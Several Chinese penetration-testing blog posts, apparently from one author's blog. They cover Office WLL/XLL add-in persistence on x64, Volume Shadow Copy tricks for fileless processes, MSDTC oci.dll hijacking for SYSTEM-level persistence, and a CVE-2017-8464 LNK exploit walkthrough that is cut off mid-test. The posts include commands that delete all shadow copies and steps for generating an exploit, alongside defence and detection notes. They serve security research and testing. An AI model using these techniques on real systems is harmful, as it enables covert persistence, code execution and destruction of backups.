  <h1>Office Persistence on x64 operating system</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/">《Use Office to maintain persistence》</a>介绍了在Office
软件中植入后门的常用方法，但并不全面，缺少64位系统的测试。而对于64位操作系统，支持32位和64位两个版本的office软件，不同office版本的利用方法是否不同呢？本文将要给出答案。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍如下内容：</p>

<ul>
  <li>64位系统安装64位Office软件的利用方法</li>
  <li>64位系统安装32位Office软件的利用方法</li>
  <li>根据测试结果优化POC</li>
</ul>

<h2 id="0x02-64位系统安装64位office软件的利用方法">0x02 64位系统安装64位Office软件的利用方法</h2>
<hr>

<p>测试系统： Win8 x64</p>

<p>开发工具：vs2012</p>

<p><strong>注：</strong></p>

<p>32位系统下安装vs2012支持生成64位的dll</p>

<p>默认主要文件安装目录：<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office</code></p>

<h3 id="1word-wll">1、Word WLL</h3>

<p>32位dll，无法加载</p>

<p>64位dll，成功加载</p>

<h3 id="2excel-xll">2、Excel XLL</h3>

<p>32位dll，无法加载</p>

<p>64位dll，成功加载</p>

<p><strong>注：</strong></p>

<p>添加导出函数xlAutoOpen的方法：</p>

<p><strong>1、使用传统的模块定义文件 (.def)</strong></p>

<p>新建dll工程，不选择导出符号</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-1.png" alt="Alt text"></p>

<p>添加同名文件.def，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXPORTS
xlAutoOpen
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-2.png" alt="Alt text"></p>

<p>编译成dll，使用IDA查看导出函数</p>

<p>显示正常</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-3.png" alt="Alt text"></p>

<p><strong>2、使用vs2012提供的便捷方法</strong></p>

<p>新建dll工程，选择导出符号</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-4.png" alt="Alt text"></p>

<p>设置导出函数为<code class="language-plaintext highlighter-rouge">xlAutoOpen</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-5.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-6.png" alt="Alt text"></p>

<p>编译成dll，使用IDA查看导出函数</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-7.png" alt="Alt text"></p>

<p>导出函数名发生变化，改变为<code class="language-plaintext highlighter-rouge">?xlAutoOpen@@YAXXZ</code></p>

<p>Excel无法加载该dll，原因是无法识别该导出函数（函数名发生变化）</p>

<p><strong>解决方法：</strong></p>

<p>使用预处理指示符<code class="language-plaintext highlighter-rouge">#pragma</code>指定链接选项，修正导出函数名称</p>

<p>添加一行代码：</p>

<p><code class="language-plaintext highlighter-rouge">#pragma comment(linker, "/EXPORT:xlAutoOpen=?xlAutoOpen@@YAXXZ")</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-8.png" alt="Alt text"></p>

<p>再次使用IDA查看导出函数，显示正常</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-22/2-9.png" alt="Alt text"></p>

<p>Excel成功加载该dll，修改成功</p>

<p><strong>注：</strong></p>

<p>已将两种方法的vs工程上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Add-Dll-Exports</p>

<p>方法1对应DllExport(Def)</p>

<p>方法2对应DllExport(declspec)</p>

<h3 id="3excel-vba-add-ins">3、Excel VBA add-ins</h3>

<p>使用32位的模板即可</p>

<h3 id="4powerpoint-vba-add-ins">4、PowerPoint VBA add-ins</h3>

<p>使用32位的模板即可</p>

<p><strong>结论：</strong></p>

<p>如果在64位系统安装了64位的Office软件，那么Word WLL需要使用64位的calc.wll，Excel XLL需要使用64位的calc.xll</p>

<h2 id="0x03-64位系统安装32位office软件的利用方法">0x03 64位系统安装32位Office软件的利用方法</h2>
<hr>

<p>默认主要文件安装目录：<code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\Microsoft Office</code>，存在重定向</p>

<p><strong>注：</strong></p>

<p>在目录<code class="language-plaintext highlighter-rouge">C:\Program Files\</code>也会创建Office目录，包含软件版本</p>

<p>也就是说，原POC中判断Microsoft Office版本的代码不需要更改</p>

<p>注册表位置<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Office\</code></p>

<p>并未被重定向至<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Wow6432Node\Microsoft\Office\</code></p>

<p>更多关于32位程序在64位系统下的重定向细节可参考之前的文章《关于32位程序在64位系统下运行中需要注意的重定向问题》</p>

<h3 id="1word-wll-1">1、Word WLL</h3>

<p>32位dll，成功加载</p>

<p>64位dll，无法加载</p>

<p>同64位office的结果相反</p>

<h3 id="2excel-xll-1">2、Excel XLL</h3>

<p>32位dll，成功加载</p>

<p>64位dll，无法加载</p>

<p>同64位office的结果相反</p>

<h3 id="3excel-vba-add-ins-1">3、Excel VBA add-ins</h3>

<p>使用32位的模板即可</p>

<h3 id="4powerpoint-vba-add-ins-1">4、PowerPoint VBA add-ins</h3>

<p>使用32位的模板即可</p>

<p><strong>结论：</strong></p>

<p>在64位系统安装32位Office软件，同32位系统测试结果相同，POC无需修改</p>

<h2 id="0x04-优化poc">0x04 优化POC</h2>
<hr>

<p>综合以上测试结论，为了使得POC支持64位系统，需要作如下修改：</p>

<p>判断操作系统位数，如果是64位，并且安装64位office软件，方法Word WLL和Excel XLL需要使用64位的dll</p>

<p>代码开发注意的细节(powershell代码)：</p>

<h3 id="1判断操作系统位数">1、判断操作系统位数</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ([Environment]::Is64BitOperatingSystem)
{
    '64-bit'
}
else
{
    '32-bit'
}
</code></pre></div></div>

<h3 id="2判断安装office软件版本">2、判断安装office软件版本</h3>

<p>通过查看默认主要安装路径：</p>

<p>32位office： <code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\Microsoft Office</code></p>

<p>64位office： <code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office</code></p>

<p>判断路径<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office</code>是否包含文件夹MEDIA</p>

<p>如果包含，那么为64位office</p>

<p>powershell代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Try  
{  
	dir C:\Program Files\Microsoft Office\MEDIA
	Write-Host "Microsoft Office: 64-bit"
}
Catch  
{ 
	Write-Host "Microsoft Office: 32-bit"
}
</code></pre></div></div>

<p>结合POC脚本，变量$OfficePath表示设置的office安装路径，默认路径为<code class="language-plaintext highlighter-rouge">"C:\Program Files\Microsoft Office\"+"Office*"</code></p>

<p>为获取路径<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office\MEDIA</code>，需要对变量$OfficePath进行字符串截取和拼接，具体代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$OfficeMainPath=$OfficePath.Substring(0,$OfficePath.LastIndexOf("\")+1)+"MEDIA"
</code></pre></div></div>

<p>此时，变量$OfficeMainPath代表路径<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office\MEDIA</code></p>

<h3 id="3判断64位系统64位office释放对应的64位dllwll和xll">3、判断64位系统+64位office，释放对应的64位dll（wll和xll）</h3>

<p>依旧是通过变量保存作base64编码后的64位wll和xll</p>

<p>将dll文件作base64编码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = [System.IO.File]::ReadAllBytes('calcx64.wll')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("calc_x64wllbase64.txt") 

$fileContent = [System.IO.File]::ReadAllBytes('calcx64.xll')
$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("calc_x64xllbase64.txt")
</code></pre></div></div>

<p>释放时先做base64解密</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
</code></pre></div></div>

<p>最终POC已在github更新，该POC能够区分操作系统和office版本，当遇到64位系统安装64位office的情况时，自动释放64位的dll</p>

<p>POC地址如下：</p>

<p>https://github.com/3gstudent/Office-Persistence</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了64位系统安装不同版本office所对应的不同利用方法，分享了在优化POC时注意的细节，至此完成对该POC的开发，便于测试。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 22, 2017
  </div>

  
</article><article class="post">
  <h1>渗透测试中的Volume Shadow Copy</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p>之前在《导出当前域内所有用户hash的技术整理》中研究过如何通过Volume Shadow Copy实现对ntds.dit文件的复制， 可用来导出域内所有用户hash。而最近在Carbon Black的博客上面又学到了一些新的利用方法，于是整理成文。</p>

<p><strong>学习链接：</strong></p>

<p>https://www.carbonblack.com/2015/08/05/bit9-carbon-black-threat-research-team-unveils-nefarious-intents-of-volume-shadows-copies/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将详细介绍以下两方面内容：</p>

<ol>
  <li>
    <p>通过Volume Shadow Copy恢复系统自动还原点内保存的文件</p>
  </li>
  <li>
    <p>通过Volume Shadow Copy创建一个无文件的进程</p>

    <p>流程如下：</p>
  </li>
</ol>

<ul>
  <li>创建当前卷影镜像</li>
  <li>启动镜像内的程序</li>
  <li>删除卷影镜像文件</li>
  <li>程序源文件被删除</li>
  <li>该进程实现无文件</li>
</ul>

<h2 id="0x02-背景知识">0x02 背景知识</h2>
<hr>

<h3 id="volume-shadow-copy-service">Volume Shadow Copy Service</h3>

<ul>
  <li>用于数据备份</li>
  <li>支持Windows Server 2003 及以上操作系统</li>
  <li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li>
  <li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li>
  <li>可使用VShadow在命令行下手动创建卷影镜像</li>
  <li>系统默认不支持VShadow，可在Microsoft Windows Software Development Kit (SDK)中获得该工具</li>
</ul>

<p><strong>注：</strong></p>

<p>Windows Server 2003和XP系统需要Volume Shadow Copy Service SDK 7.2，下载地址如下：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=23490</p>

<p>Windows Server 2008 R2和Windows 7系统需要对应的SDK版本(该版本Win8也适用)，下载地址如下：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=3138</p>

<h2 id="0x03-恢复系统自动还原点内保存的文件">0x03 恢复系统自动还原点内保存的文件</h2>
<hr>

<h3 id="常用命令">常用命令</h3>

<p>通过vssadmin查看卷影镜像：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
</code></pre></div></div>

<p><strong>注：</strong>
vssadmin系统自带</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/2-1.png" alt="Alt text"></p>

<p>通过wmic查看卷影镜像：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ShadowCopy GET /all /FORMAT:list
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/2-2.png" alt="Alt text"></p>

<p>提取出关键的信息DeviceObject、ID和InstallDate，对应wmic命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>在删除某个卷影镜像时需要填入该卷影镜像的ID</p>

<h3 id="创建符号链接">创建符号链接</h3>

<p>将卷影镜像和文件夹建立虚拟关联，类似于通过快捷方式可访问卷影镜像中保存的文件，使用mklink命令，系统自带，需要<code class="language-plaintext highlighter-rouge">管理员权限</code>
格式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mklink /d 指定快捷方式路径 [Shadow copy device name]\
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>[Shadow copy device name]后要带一个\
如果不小心漏掉\,在建立关联后无法对其进行后续操作，可直接删除该关联再重新建立</p>

<p>例如，选取<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</code>，对应的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\
</code></pre></div></div>

<p>如图，成功创建</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/2-4.png" alt="Alt text">
<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/2-5.png" alt="Alt text"></p>

<p><code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</code>对应的时间点为InstallDate=20160907160419.347805+480，于是c:\testvsc中保存的即为此时间点系统中保存的文件</p>

<h2 id="0x04-创建一个无文件的进程">0x04 创建一个无文件的进程</h2>
<hr>
<p>测试系统： Win 8.1 x86</p>

<p>测试exe： Win32Project1.exe</p>

<p>执行后弹框，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/2-6.png" alt="Alt text"></p>

<h3 id="1-创建卷影镜像">1. 创建卷影镜像</h3>
<p>上传Win32Project1.exe和VShadow.exe，为当前系统创建卷影镜像，管理员权限执行如下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -p c:\
</code></pre></div></div>

<p>如图，为C盘创建卷影镜像，DeviceName为<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5</code>，ID为{10f63e0b-e47d-4121-969f-87fa458c5043}</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/3-1.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/3-2.png" alt="Alt text"></p>

<h3 id="2-创建符号链接">2. 创建符号链接</h3>
<p>命令行执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mklink /d c:\vscfiletest \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\
</code></pre></div></div>

<p>创建文件夹c:\vscfiletest，执行其中的测试文件Win32Project1.exe
如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/3-3.png" alt="Alt text"></p>

<p>使用Process Explorer查看Win32Project1.exe，路径显示为c:\vscfiletest\test\Win32Project1.exe</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/3-4.png" alt="Alt text"></p>

<h3 id="3-删除符号链接">3. 删除符号链接</h3>
<p>删除快捷方式文件夹就好，命令行参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rmdir c:\vscfiletest\
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>即使文件夹中的Win32Project1.exe正在运行，仍可删除</p>

<h3 id="4删除卷影镜像">4、删除卷影镜像</h3>

<p>通过wmic找到卷影镜像对应的ID：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\</code>对应的ID为{10f63e0b-e47d-4121-969f-87fa458c5043}</p>

<p>完整的删除代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /shadow={10f63e0b-e47d-4121-969f-87fa458c5043} /quiet
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>加入/quiet是为了强制删除，省去输入Y确认</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/3-5.png" alt="Alt text"></p>

<p><strong>补充：</strong>
删除所有卷影镜像的命令为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /all /quiet
</code></pre></div></div>

<p>此时，Win32Project1.exe仍在后台运行，而源文件c:\vscfiletest\test\Win32Project1.exe已经不存在</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-7/3-6.png" alt="Alt text"></p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>
<ul>
  <li>利用Volume Shadow Copy的前提是需要获得管理员权限，所以首先需要防止攻击者获得管理员权限</li>
  <li>对于个人用户主机，建议直接禁用Volume Shadow Copy服务</li>
  <li>Carbon Black的博客上面提供的防御方法如下：</li>
</ul>

<blockquote>
  <p>Search by hashes:</p>

  <p>process_md5:3e1360a23ea5f9caf4987ccf35f2fcaf OR
process_md5:576b379a59d094fb7b06c261a96034a6 OR
process_md5:d0cd7ad91b2ff568275d497214ff185c OR
process_md5:97fd0f3c05f1707544a9a6a0c896b43e OR
process_md5:d560c155b68121d98f8370e7deafbc4d OR
process_md5:c5d2992c8cba0771f71fe4d7625a0b8b OR
process_md5:53d3e33ad31af6716559f29e889aca49</p>

  <p>Search for Vshadow being executed:</p>

  <p>modload:vss_ps.dll cmdline:”-p C:\”</p>

  <p>modload:vss_ps.dll cmdline:”-p” -path:System32\werfault.exe</p>

  <p>Search for mklink being executed via a shell out:</p>

  <p>cmdline:””C:\Windows\system32\cmd.exe” /c mklink /D”</p>

  <p>Search for processes being executed from the volume shadow copy
locations:</p>

  <p>path:device/harddiskvolumeshadowcopy*</p>

  <p>path:device/harddiskvolume*</p>
</blockquote>

<p>以上引用自https://www.carbonblack.com/2015/08/05/bit9-carbon-black-threat-research-team-unveils-nefarious-intents-of-volume-shadows-copies/</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>
<p>总结一下渗透测试中Volume Shadow Copy的作用：</p>

<ol>
  <li>
    <p>通过Volume Shadow Copy恢复系统自动还原点内保存的文件</p>
  </li>
  <li>
    <p>通过Volume Shadow Copy创建一个无文件的进程</p>
  </li>
  <li>
    <p>复制正被程序占用的文件，如ntds.dit，当然powershell版的NinjaCopy也能实现相同的功能,可参照https://github.com/3gstudent/NinjaCopy</p>
  </li>
</ol>

<p><strong>更多学习资料：</strong></p>

<p>https://www.carbonblack.com/2015/08/03/new-crypto-ransomware-lurks-in-the-shadows/
http://securityweekly.com/2012/10/15/volume-shadow-copies-the-los/
https://technet.microsoft.com/en-us/library/ee923636.aspx</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on September  7, 2016
  </div>

  
</article><article class="post">
  <h1>Use msdtc to maintain persistence</h1>

  <div class="entry">
    <hr>

<h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Shadow Force曾经在域环境中使用过的一个后门，利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测。本文将要对其进行测试，介绍更多利用技巧，分析防御方法。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>MSDTC简介</li>
  <li>后门思路</li>
  <li>后门验证</li>
  <li>更多测试和利用方法</li>
  <li>检测防御</li>
</ul>

<h2 id="0x02-msdtc简介">0x02 MSDTC简介</h2>
<hr>

<h3 id="msdtc">MSDTC：</h3>

<ul>
  <li>
    <p>对应服务MSDTC，全称<code class="language-plaintext highlighter-rouge">Distributed Transaction Coordinator</code>，Windows系统默认启动该服务</p>
  </li>
  <li>
    <p>对应进程msdtc.exe,位于%windir%\system32\</p>
  </li>
  <li>
    <p>msdtc.exe是微软分布式传输协调程序，该进程调用系统Microsoft Personal Web Server和Microsoft SQL Server</p>
  </li>
</ul>

<h2 id="0x03-后门思路">0x03 后门思路</h2>
<hr>

<p><strong>参考链接：</strong></p>

<p>http://blog.trendmicro.com/trendlabs-security-intelligence/shadow-force-uses-dll-hijacking-targets-south-korean-company/</p>

<p>文中介绍的思路如下：</p>

<p>当计算机加入域中，MSDTC服务启动时，会搜索注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-31/2-1.png" alt="Alt text"></p>

<p>分别加载3个dll：<code class="language-plaintext highlighter-rouge">oci.dll</code>,<code class="language-plaintext highlighter-rouge">SQLLib80.dll</code>,<code class="language-plaintext highlighter-rouge">xa80.dll</code></p>

<p>然而特别的是，<strong>Windows系统默认不包含oci.dll</strong></p>

<p>也就是说，将payload.dll重名为oci.dll并保存在<code class="language-plaintext highlighter-rouge">%windir%\system32\</code>下</p>

<p>域中的计算机启动服务MSDTC时就会加载该dll，实现代码执行</p>

<h2 id="0x04-后门验证">0x04 后门验证</h2>
<hr>

<p>测试系统： Win7 x64</p>

<p>搭建域环境，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-31/2-2.png" alt="Alt text"></p>

<p>使用Procmon监控msdtc的启动过程，筛选进程msdtc.exe，查看文件操作，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-31/2-3.png" alt="Alt text"></p>

<p>msdtc.exe确实会尝试加载oci.dll，并且由于系统默认不存在oci.dll,导致加载失败</p>

<p>使用64位的测试dll,下载地址如下：</p>

<p>https://github.com/3gstudent/test/blob/master/calc_x64.dll</p>

<p>将其保存在<code class="language-plaintext highlighter-rouge">%windir%\system32\</code>下</p>

<p>结束进程msdtc.exe，命令行参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">taskkill /f /im msdtc.exe</code></p>

<p>等待msdtc.exe重新启动</p>

<p>等待一段时间，mstdc.exe重新启动,成功加载oci.dll，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-31/2-4.png" alt="Alt text"></p>

<p>calc.exe以system权限启动</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-31/2-5.png" alt="Alt text"></p>

<p>经实际测试，该方法偶尔会出现bug，通过taskkill结束进程后，msdtc.exe并不会重新启动</p>

<p><strong>解决方法：</strong></p>

<p>重新启动服务MSDTC就好，命令行参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">net start msdtc</code></p>

<h2 id="0x05-更多测试">0x05 更多测试</h2>
<hr>

<h3 id="1测试32位系统">1、测试32位系统</h3>

<p>32位系统换用32位dll就好，下载地址如下：</p>

<p>https://github.com/3gstudent/test/blob/master/calc.dll</p>

<h3 id="2测试64位系统">2、测试64位系统</h3>

<p>64位系统，虽然SysWOW64文件夹下也包含32位的msdtc.exe，但是MSDTC服务只启动64位的msdtc.exe</p>

<p>因此，不支持32位oci.dll的加载</p>

<h3 id="3通用测试">3、通用测试</h3>

<p>经实际测试，MSDTC服务不是域环境特有，工作组环境下默认也会启动MSDTC服务</p>

<p>也就是说，该利用方法不仅适用于域环境，工作组环境也同样适用</p>

<h3 id="4以管理员权限加载ocidll降权启动">4、以管理员权限加载oci.dll（降权启动）</h3>

<p>上述方法会以system权限加载oci.dll，提供一个以管理员权限加载oci.dll（降权启动）的方法：</p>

<p>管理员权限cmd执行：</p>

<p><code class="language-plaintext highlighter-rouge">msdtc -install</code></p>

<p>启动的calc.exe为high权限，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-31/3-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>关于为什么要降权及降权的更多实现方式可参照文章</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/">《渗透技巧——程序的降权启动》</a></p>

<h2 id="0x06-检测防御">0x06 检测防御</h2>
<hr>

<h3 id="检测">检测：</h3>

<p>检测%windir%\system32\是否包含可疑oci.dll</p>

<h3 id="防御">防御：</h3>

<p>对于普通用户主机，建议禁用服务MSDTC</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了MSDTC的相关利用技巧，不仅能用作后门，同样可用于程序的降权启动。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 31, 2017
  </div>

  
</article><article class="post">
  <h1>Windows Lnk远程代码执行漏洞(CVE-2017-8464)利用测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>北京时间6月14日凌晨，微软发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。</p>

<p>该漏洞的原理同2010年据称美国和以色列入侵并破坏伊朗核设施的震网行动中所使用的震网病毒（Stuxnet）非常相似，所以也被一些人称为“震网三代”。</p>

<p>然而，通过百度搜索关键词“cve-2017-8464复现”找到的国内一些文章，对该漏洞的复现存在误解，错把通过快捷方式执行powershell代码当作了该漏洞的利用方法。</p>

<p>所以，本文将要纠正这个错误。</p>

<p>并且，目前可供测试的msf利用脚本存在一个bug，漏洞触发后进程explorer.exe崩溃，漏洞利用不够完美。</p>

<p>考虑到距补丁公开日期已经超过45天，所以本文将要公开利用脚本中bug的修复方法，实现该漏洞的“完美利用”。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>漏洞简介</li>
  <li>漏洞测试</li>
  <li>bug修复</li>
  <li>防御</li>
</ul>

<h2 id="0x02-漏洞简介">0x02 漏洞简介</h2>
<hr>

<p>该漏洞是一个微软Windows系统处理LNK文件过程中发生的远程代码执行漏洞。
当存在漏洞的电脑被插上存在病毒木马的U盘时，不需要任何额外操作，漏洞攻击程序就可以借此完全控制用户的电脑系统。
该漏洞也可能籍由用户访问网络共享、从互联网下载、拷贝文件等操作被触发和利用攻击。</p>

<p>也就是说，漏洞可以在以下任一条件下触发：</p>

<p>1、系统开启U盘自动播放功能，插入U盘，漏洞触发
2、通过网络共享访问该文件目录
3、直接访问该文件目录</p>

<h2 id="0x03-漏洞测试">0x03 漏洞测试</h2>
<hr>

<p>目前公开渠道可供测试利用的脚本有如下两个：</p>

<p><strong>1、msf利用脚本</strong></p>

<p>作者：ykoster</p>

<p>下载地址：https://github.com/rapid7/metasploit-framework/pull/8767</p>

<p><strong>2、python利用脚本</strong></p>

<p>作者：nixawk</p>

<p>下载地址：https://github.com/nixawk/labs/blob/master/CVE-2017-8464/exploit_CVE-2017-8464.py</p>

<p>本文着重测试msf脚本，将exp拷贝至U盘，测试通过U盘触发漏洞的利用方法</p>

<h3 id="实际测试">实际测试：</h3>

<p>测试系统： kali 2.0</p>

<p><strong>1、下载msf脚本</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /usr/share/metasploit-framework/modules/exploits/windows/fileformat/
wget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb
</code></pre></div></div>

<p><strong>2、生成exp</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploits/windows/fileformat/cve_2017_8464_lnk_rce
set payload windows/x64/exec
set cmd calc.exe
set EXITFUNC thread
exploit
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>msf脚本默认对应系统Windows x64，所以payload也选择64位的exec</p>

<p>参数设置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-1.png" alt="Alt text"></p>

<p>执行后，在/root/.msf4/local/生成24个利用文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-2.png" alt="Alt text"></p>

<p>kali2.0下无法直接访问该文件夹，可通过命令行将<code class="language-plaintext highlighter-rouge">/root/.msf4/local/</code>下的所有文件复制到<code class="language-plaintext highlighter-rouge">/root/1</code>下</p>

<p>命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">cp -r /root/.msf4/local/ /root/1</code></p>

<p>复制文件，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-1/2-3.png" alt="Alt text"></p>

<p>将以上文件复制到U盘，在另一未打补丁的Win7 x64系统测试</p>

<p><strong>3、测试</strong></p>

